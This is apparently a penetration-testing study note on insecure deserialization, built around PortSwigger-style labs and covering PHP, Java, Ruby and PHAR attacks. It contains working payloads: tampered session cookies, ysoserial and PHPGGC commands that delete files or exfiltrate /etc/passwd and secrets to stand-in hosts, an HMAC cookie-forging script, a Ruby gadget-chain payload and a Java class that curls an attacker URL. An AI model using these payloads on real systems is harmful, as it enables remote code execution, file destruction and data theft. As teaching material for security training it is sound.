#Insecure-Deserialization #Completed

![[Insecure Deserialization.jpg]]
# Insecure Deserialization

Serialization converts complex data structures such as objects and fields, into a flatter format that is sent and received as a sequential stream of bytes. When serialization an object, its state is also persisted.

Deserialization restores the byte stream to a fully functional replica of the original object in the state it was when it was serialized.  Some languages serialize objects into binary formats, whereas others use different string formats. All of the original object's attributes are stored in the data stream, including private fields.

Insecure deserialization occurs when user controllable data is deserialized by a site, enabling an attacker to manipulate serialized objects to pass harmful data. It may be possible to replace a serialized object with a different object with a different class. 

If user input contains malicious data and it is deserialized server-side, it turns the user input into an object. The objects can contain special methods that can execute arbitrary code. Cookies may store session information that is serialized - if so it could provide an attack vector.

<div class=video-container><iframe width="560" height="315" src="https://www.youtube.com/embed/jwzeJU_62IQ?si=HTdtavJ5WOdjLkYQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe></div>
# Recon

Look at all data being passed into the site and identify anything that looks serialized. For example, PHP uses a human readable string format with letters representing the data type and numbers representing the length of each entry such as a `User` object with the attributes:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

After serialization, it appears to be:

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

- `O:4:"User"` - object with 4 character class name `User`
- `2` - object has 2 attributes
- `s:4:"name"` - key of the first attribute is the 4 character string `name`
- `s:6:"carlos"` - value of the first attribute is the 6 character string `carlos`
- `s:10:"isLoggedIn"` - key of second attribute is 10 character string `isLoggedIn`
- `b:1` - value of the second attribute is the boolean value `true`

>[!info]
> The native methods in PHP are `serialize()` and `unserialize()`. If source code is available, search for `unserialize()`.

Java uses binary serialization formats, but can still be identified. Serialized Java objects always begin with the same bytes - encoded as `ac ed` in hexadecimal or `ro0` in Base64.

Any class that implements `java.io.Serializable` can be serialized and deserialized. Take note of any code that uses the `readObject()` method which is used to read and deserialize data from an `InputStream`.
# Tools

- Ysoserial ([https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f](https://forum.portswigger.net/thread/ysoserial-stopped-working-b5a161f42f))
- PHP Generic Gadget Chains (PHPGGC)
- Java Deserialization Scanner - [https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)
# Modifying Serialized Objects

There's two approaches when manipulating serialized objects - editing the object directly in its byte stream form or writing a script in the language to create and serialize the new object yourself. 

When tampering, as long as the attacker preserves a valid serialized object, the deserialization process will create a server-side object with the modified attribute values. For example, a site uses a serialized `User` object to store user session data in a cookie which decodes to:

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

Try changing the boolean value of `isAdmin` to 1, re-encode the object and overwrite the cookie. If the site uses the cookie to check if the current user has access to an admin panel via:

```php
$user = unserialize($_COOKIE);
if ($user->isAdmin === true) {
// allow access to admin interface
}
```

The code would instantiate a User object based on the data from the cookie. The data could be passed to a conditional statement and would allow for easy privilege escalation. 

For example, a cookie value may appear base64 encoded. Try decoding it and seeing what the result is. It may appear as:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

Attempt to change the boolean value of "admin" to 1 and re-submitting (if decoded, base64 encode it and URL encode key characters).
# Modifying Serialized Data Types

It's possible to submit unexpected data types. PHP logic is vulnerable due to behaviour of its loose comparison operator when comparing different data types. Performing a loose comparison between an integer and a string, PHP tries to convert the string to an integer, meaning that `5 == "5"` evaluates to TRUE.

PHP also converts an entire string to an integer value based on the initial number. For example, `5 == "5 of something"` is treated as `5 == 5`. When comparing a string to 0, it becomes:

- `0 == "Example string"` which returns TRUE

Since there's no number in the string, PHP treats the entire string as the integer 0. If the string begins with numeric characters, it converts those characters into their numeric equivalent. Any non-numeric characters that follow are ignored. If the string does not start with a number, or contains no numeric values, it is treated as `0`.

A dangerous example may be:

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

An attacker can modify the password to contain the integer 0 instead of the expected string. If the stored password does not start with a number, the condition returns TRUE. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would be FALSE.

>[!info]
>Remember to update any type labels and length indicators in the serialized data.

For example, a cookie may decode as:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ba13m0uqsjkwm1efrogb3libbsvbd8js";}
```

Try changing the username to `administrator`, update the length, change the `access_token` to the integer `0` and remove the double quotes and update the data type label by replacing `s` with `i` (for integer) to become:

```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

Re-encode and submit the value as the cookie and observe any changes or additional functionality.
# Exploiting Application Functionality

A site may perform dangerous operations on data from a deserialized object. Try using insecure deserialization to pass in unexpected data and leverage the related functionality to do damage.

A delete user functionality may delete the user's profile picture by accessing the file path in the following attribute:

```php
$user->image_location
```

If `$user` was created from a serialized object, try exploiting it by passing in a modified object with the `image_location` set to an arbitrary file path. If the user deletes their account, it may delete the arbitrary file as well.

For example, try decoding a serialized cookie and observe for any interesting attributes:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"er6f2o53jhas88h9g9s2u487zmivq5k3";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

Attempt to edit the serialized data so the `avatar_link` points to another file on the system and update the length from 19. Try submitting the cookie and delete the account to potentially delete the specified file.

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"er6f2o53jhas88h9g9s2u487zmivq5k3";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
# Magic Methods

These are methods that you don't have to explicitly invoke. They are invoked automatically when a particular event occurs. They are common in object-oriented languages and are sometimes indicated by prefixing or surrounding the method name with double underscores.

A common example in PHP is `__construct()` which is invoked when an object of the class is instantiated, similiar to `__init__` in Python. Constructor magic methods like this contain code to initialize the attributes of the instance, but they can be customized by devs to execute any code.

They're dangerous when the code they execute handles attacker-controllable data from a deserialized object. An attacker can automatically invoke methods on the deserialized data when the conditions are met. 

Some languages have magic methods invoked automatically during the deserialization process such as PHP's `unserialize()` method which looks for and invokes an objects `__wakeup()` magic method. 

In Java, the same applies to `ObjectInputStream.readObject()` method which is used to read data from the initial byte stream and acts like a constructor for re-initializing a serialized object. Serializable classes can also declare their own `readObject()` method such as:

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```
# Arbitrary Object Injection in PHP

In OOP, methods available to an object are determined by its class. If you can manipulate which class of object is being passed in as serialized data, you can influence what code is executed after deserialization.

Deserialization methods don't typically check what they deserialize, meaning you can pass objects of any serializable class available, allowing you to create instances of arbitrary classes. An unexpected object type may cause an exception in the logic, but the malicious object will already be instantiated.

If source code access is available, study all of the available classes. To construct a simple exploit, try looking for classes containing deserialization magic methods and check if any perform dangerous operations on controllable data.

>[!info]
>Classes containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations - gadget chains.

For example, the cookie may be a serialized PHP object. Try to look through the site map and all links for references to interesting files such as `/libs/customTemplate.php`. Try appending `~` to the end of a filename to potentially read source code of a PHP file.

The class may include a magic method such as `__destruct()` which invokes an `unlink()` method on the `lock_file_path` attribute which deletes files on the path:

```php
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
```

If the app deserializes untrusted objects, an attacker can inject a malicious object that sets the `$lock_file_path` property to point to an arbitrary file on the system. When the object is destroyed, the `__destruct()` method would attempt to delete the file.

A customTemplate object could be made with the `lock_file_path` attribute set to an arbitrary file such as:

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:11:"/etc/passwd";}
```

Attempt to submit the serialized object as the session cookie. If vulnerable, the magic method would be invoked and the file deleted.
# Gadget Chains

A gadget is a snippet of code that can help achieve a particular goal. By chaining multiple gadgets together, an attacker can pass their input into a dangerous "sink gadget". A gadget chain is not a payload of chained methods since all code exists on the site already.

>[!info]
>A gadget chain is a chain of function calls from a source method, generally readObject, to a sink method which will perform dangerous actions like calling the exec method of the Java runtime.

>[!important]
>For more information regarding gadget chains, please see the [[Insecure Deserialization#Deep Dive into Gadget Chains|following]].

The attacker controls the data that is passed into the gadget chain, typically via a magic method invoke during deserialization known as a "kick-off gadget". 
# Java Deserialization with Apache Commons

Manually identifying gadget chains is fairly long and almost impossible without source code access. There are several tools available that provide a range of pre-discovered chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, it may work on another.

The tool [ysoserial](https://github.com/frohoff/ysoserial) lets you choose a provided gadget chain for a library and pass it a command to execute and then creates an appropriate serialized object based on the selected chain.

>[!info]
>In Java versions >16, you must specify a series of command-line arguments for Java to run ysoserial such as the below.

```java
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload] '[command]'
```

For easier execution of ysoserial, install Java JDK 11 on a Linux virtual machine:

```bash
sudo apt install openjdk-11-jdk
```

It will install a version of Java that works well with ysoserial under the following path:

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java
```

To run ysoserial, simply run:

```bash
sudo ./java -jar ~/Tools/ysoserial/ysoserial-all.jar [PAYLOAD] [COMMAND] | base64 -w 0
```

For example, try authenticating and analysing anything that appears to be a serialized object. If suspected, try base64 decoding it and observe the decoded contents - if it contains `ac ed` at the start, it is likely Java. 

Java Deserialization Scanner can be used to detect vulnerable libraries if it works. If vulnerable, run ysoserial to generate a base64-encoded serialized object:

```bash
sudo ./java -jar ~/Tools/ysoserial/ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

Attempt to replace the session cookie with the resulting payload. If extracting data is preferred, modify the payload as follows, with testing external DNS communication first:

```bash
sudo ./java -jar ~/Tools/ysoserial/ysoserial-all.jar CommonsCollections4 "host [COLLABORATOR-DOMAIN]" | base64 -w 0
```

```bash
sudo ./java -jar ~/Tools/ysoserial/ysoserial-all.jar CommonsCollections4 "wget --post-file /home/carlos/secret [COLLABORATOR-DOMAIN]" | base64 -w 0
```

```bash
sudo ./java -jar ~/Tools/ysoserial/ysoserial-all.jar CommonsCollections4 "curl -X POST -d \$(cat /etc/passwd) http://your-server.com/receive" | base64 -w 0
```

Not all chains allow running arbitrary code. Some are useful for other things including:

- `URLDNS` triggers a DNS lookup. It does not rely on the target app using a specific vulnerable library in any known Java version. If you find a serialized object, try using the gadget chain to generate an object to trigger a DNS interaction with Collaborator.
- `JRMPClient` causes the server to try establishing a TCP connection to an IP address. May be useful in environments where all outbound traffic is firewalled, including DNS lookups. If the app responds immediately with a local IP, but hangs for external IP, it indicates it works as the server tried to connect externally.
# PHP Deserialization with Gadget Chains

Most languages have equivalent PoC tools. For PHP based sites, there is [PHP Generic Gadget Chains (PHPGGC)](https://github.com/ambionics/phpggc)

For example, try to enumerate the app and identify if there are any dependencies that the app is using. As an example, the cookie may be a base64-encoded token that can be decoded to:

```json
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJhc2lrNmI0cnh4ODl4ejI5OTQxd2p4bjRsZXpibnQwcSI7fQ==","sig_hmac_sha1":"515450de20486a723cb9767ebb9c2b9f217fc4bb"}
```

Attempt to decode the token further may show a PHP serialized object:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"asik6b4rxx89xz29941wjxn4lezbnt0q";}
```

Analyse the contents and attempt to modify the cookie such as changing the access token value and username and re-submit. If an error appears, analyse the error message as it may reveal certain things like:

- Location of interesting files
- Framework in use

>[!info]
>Try the "Engagement Tools" --> "Find Comments" option to search developer comments.

If the `phpinfo.php` page is available, it can leak a secret key being used. 

If the version is leaked during an error message such as `Symfony 4.3.6`, attempt to use PHPGGC to create a serialized object via a gadget chain and specifying the framework in use:

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

To exploit if it's been signed, the following script can be used to sign it using the secret key (if found):

```php
<?php
$payload = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $payload . '","sig_hmac_sha1":"' . hash_hmac('sha1', $payload, $secretKey) . '"}');
echo $cookie;
?>
```

Run it via `php` command and insert the new value as the session token and submit:

```bash
php8.2 exploit.php
```
# Ruby Deserialization with Gadget Chains 

There may not be a tool for exploiting known gadget chains in the framework. If not, try looking online to see if there are any documented exploits that can be adapted manually. Tweaking code may require basic understanding of the language and framework, and you may need to sometimes serialize the object yourself.

For example, decoding an access token may reveal a Ruby serialized object via the first two bytes (\\x04\\x08). Try searching online for "Ruby serialization gadget chain exploit". A famous exploit is the [following](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) in Ruby 2.x-3.x.

The blog details a script to trigger a call to execute the `id` command:

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "id")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
puts Marshal.load(payload)
```

Try editing the `id` command to the command required. Additionally, you may need to include a section to base64 encode the payload at the bottom via the `puts` method:

```ruby
puts Base64.encode64(payload)
```

>[!info]
>Use an online compiler such as https://onlinegdb.com/online_ruby_compiler

New lines may need to be removed using truncation:

```bash
echo "[PAYLOAD]" | tr -d "\n\r"
```
# Developing Custom Gadget Chains

To build a custom gadget, it's ideal to have access to the source code. The first step is to identify a class that contains a magic method invoked during deserialization. Assess the code the magic method executes and see if it does anything dangerous with user controllable attributes.

If not directly exploitable, it can be used as the kick off gadget. Study any methods the kick off gadget invokes. If none of them do something dangerous with data you control, look closer at each of the methods that they subsequently invoke and so on.

Once you find how to successfully construct a gadget chain within the app code, the next step is to create a serialized object containing the payload. This is a case of studying the class declaration in the source code and creating a valid serialized object with the appropriate values required for exploitation.

Working with binary formats like Java deserialization objects can be difficult. When making minor changes to an existing object, you may be comfortable working directly with the bytes. When making significant changes, it is much simpler to write your own code in the target language to generate and serialize the data yourself.
# PHAR Deserialization

In PHP, it's possible to exploit deserialization if there is no use of the `unserialize()` method. It provides several URL-style wrappers that can be used for handling different protocols when accessing files paths such as the `phar://` wrapper which provides a stream interface for accessing PHP Archive files.

PHAR manifest files contains serialized metadata. If you perform any filesystem operations on a `phar://` stream, the metadata is implicitly deserialized. It means a `phar://` stream can potentially be a vector.

In case of obvious dangerous filesystem methods like `include()` or `fopen()`, sites are likely to have implemented counter-measures to reduce the potential for them to be used maliciously. Methods such as `file_exists()` are less likely to be as protected.

The technique requires the uploading of PHAR to the server such as via an image upload.  If you can create a polyglot file with a PHAR masquerading as a simple JPG, you can bypass the site's validation checks. If you can then force a site to load the polyglot from a `phar://` stream, any harmful data will be deserialized.

As long as the class of the object is supported by the site, both the `__wakeup()` and `__destruct()` magic methods can be invoked in this way, allowing you to potentially kick off a gadget chain.

































# Deep Dive into Gadget Chains

In layman's terms, imaging your kid has a bunch of favourite toys - race car, dinosaur, snake, building blocks. Think about setting them up in a line. The race car zooms forward and bumps into the dinosaur, which then roars and falls onto the snake. The snake wiggles and pushes a block into a pool of water where a toy boat starts to float.

As an example, an app has a functionality to serialize book objects to send them between various microservices:

```java
public final class Book implements Serializable {
   public String title;
   
   public Book(String title) {
      this.title = title;
   }
  
   @Override
   public String toString() {
      return "Book [title=" + this.title + "]";
   }
}
```

There may also be another part that is a REST controller:

```java
public class HomeController {

  @RequestMapping("/serialize")
  public String serialize() {
    Book myBook = new Book("A cool book!");
    return serializeBook(myBook);
  }

  @PostMapping("/deserialize")
  public String deserialize(@RequestBody String bookBase64) {
    Book myBook = deserializeBook(bookBase64);
    return myBook.toString();
  }
}
```

The implementations of these may be:

```java
/**
 * Serializes a Book object and returns it as base64 string
 */
private String serializeBook(Book myBook) {
   ByteArrayOutputStream baos = null;
   
   baos = new ByteArrayOutputStream();
   ObjectOutputStream oos = new ObjectOutputStream(baos);
   oos.writeObject(myBook);
   oos.close();
  
   return Base64.getEncoder().encodeToString(baos.toByteArray());
}

/**
 * Deserializes a base64 string back into a Book object and returns it
 */
 private Book deserializeBook(String base64SerializedBook) {
   Book someBook = null;

   byte[] data = Base64.getDecoder().decode(base64SerializedBook);
   ObjectInputStream ois = new ObjectInputStream(
      new ByteArrayInputStream(data)
   );
 
   someBook = (Book) ois.readObject();
   ois.close();
   return someBook;
}
```

It has a REST service with 2 endpoints:

- One to serialize books which returns a base64 encoded, serialized book object
- One that takes that base64 string, deserializes the book object and returns it

A new function may be asked to be added - to run an OS command every time a book is deserialized. A magic method could be used called `readObject` which would be automatically called whenever a book is deserialized. The adjusted Book.java may be:

```java
public final class Book implements Serializable {
   public String title;
   public String cmd;
   
   public Book(String title, String cmd) {
      this.title = title;
      this.cmd = cmd;
   }

   @Override
   public String toString() {
      return "Book [title=" + this.title + ", cmd=" + this.cmd + "]";
   }

   private void readObject(ObjectInputStream in) {
      in.defaultReadObject();

      // ... some more logic and ultimately execute `this.cmd`
      execute(this.cmd);
   }  
}
```

As an attacker, to exploit it, you would create a malicious object such as:

```java
public class EvilBook {

  public static void main(String[] args) {
    Book book = new Book("someTitle", "curl https://<our_collaborator_URL>");
    String bookSerialized = serializeBook(book);

    FileWriter fileWriter = new FileWriter("naughty_Book.ser");
    PrintWriter printWriter = new PrintWriter(fileWriter);
    printWriter.print(bookSerialized);
    printWriter.close();
  }

  /**
   * Serializes a Book object and returns it as base64 string
   */
  public static String serializeBook(Object myBook) {
    ByteArrayOutputStream baos = null;
    
    baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(myBook);
    oos.close();

    return Base64.getEncoder().encodeToString(baos.toByteArray());
  }
}
```

The `serializeBook()` takes in a book object again, serializes it and encodes it to a base64 string. The `main()` creates a book object that uses the new `cmd` property added earlier. If the command would execute, it would fire `curl https://collaborator` which would send a request to the server.

The only other things that happens is a `book` object is created with the `cmd`, serialize it to a base64 string and store it in a string in a file called `naughty_Book.ser`. 

After compiling and running it, it outputs `naughty_Book.ser`. Then, you can simply send the content of it to the `/deserialize` endpoint of the REST controller which would deserialize the naughty_Book, and automatically call the custom `readObject()` method.

Finally, `execute(this.cmd)` would execute the curl command, achieving RCE.

>[!info]
>Some useful blogs include [Synacktiv](https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-1).

